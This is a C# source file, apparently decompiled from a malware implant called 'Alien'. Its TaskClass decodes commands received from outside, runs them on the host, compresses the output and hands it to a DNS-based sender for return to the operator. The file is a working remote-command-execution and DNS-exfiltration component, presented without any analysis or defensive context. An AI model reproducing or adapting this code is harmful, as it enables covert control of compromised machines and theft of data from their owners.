using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;

namespace Alien
{
	internal class TaskClass
	{
		public static List<byte[]> ListData;
		public static MachineCommand DoTask()
		{
			MachineCommand machineCommand = MachineCommand.Failed;
			try
			{
				if (TaskClass.ListData.Count > 0 && TaskClass.ListData[0] != null)
				{
					byte[] array = TaskClass.ListData[0];
					Enums.TaskType taskType = (Enums.TaskType)array[0];
					byte[] array2 = array.Skip(1).ToArray<byte>();
					byte[] resultData = null;
					
					string cmd = Encoding.UTF8.GetString(array2);
					string text = cmd;		
					string s2 = Cmd.ShrinkCmdResult(Cmd.ExecCmd(text));
					resultData = Encoding.UTF8.GetBytes(s2);

					if (resultData != null)
					{
						byte[] array3 = Deflate.Compress(resultData);
						if (array3.Length < resultData.Length)
						{
							resultData = new byte[]
							{
								61
							}.Concat(array3).ToArray<byte>();
						}
						else
						{
							resultData = new byte[]
							{
								57
							}.Concat(resultData).ToArray<byte>();
						}
					}
					byte[] array4 = new byte[(resultData == null) ? 0 : resultData.Length];
					if (resultData != null)
					{
						Array.Copy(resultData, 0, array4, 0, resultData.Length);
					}
					TaskClass.ListData.RemoveAt(0);
					machineCommand = MachineCommand.HasResult;
					DnsClass.ReadySend(array4);
				}
			}
			catch (Exception ex)
			{
				Util.Log(ex.ToString());
				machineCommand = MachineCommand.Failed;
			}
			Util.Log(string.Format("DoTask : {0}", machineCommand));
			return machineCommand;
		}
	}
}
